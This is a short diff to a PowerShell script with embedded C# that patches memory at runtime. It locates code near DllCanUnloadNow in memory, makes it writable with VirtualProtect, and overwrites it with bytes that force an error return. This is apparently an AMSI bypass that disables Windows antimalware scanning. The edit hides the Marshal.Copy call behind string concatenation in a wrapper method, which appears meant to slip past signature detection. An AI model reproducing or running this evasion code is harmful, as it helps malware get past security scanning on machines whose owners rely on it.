@@ -23,7 +23,8 @@ public class K2 {
 
     [DllImport("kernel32",EntryPoint="Virtual"+"Protect")]
     public static extern bool vp(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
+	public static void Copy(Byte[] source, Int32 startIndex, Int"+"Ptr destination, Int32 length)
+	{ Mar"+"shal.Copy(source, startIndex, destination, length);}
 }
 "@
 
@@ -87,9 +88,8 @@ function Invoke-bypass2 {
 		[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)
 		$p = 0
 		[K2]::vp($targetedAddress, [uint32]2, 0x40, [ref]$p) | Out-Null
-		$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3,0xC3)
-		
-		[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $targetedAddress, 7)
+		$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3,0xC3)		
+		[K2]::Copy($Patch, 0, $targetedAddress, 7)
 
     }
 }
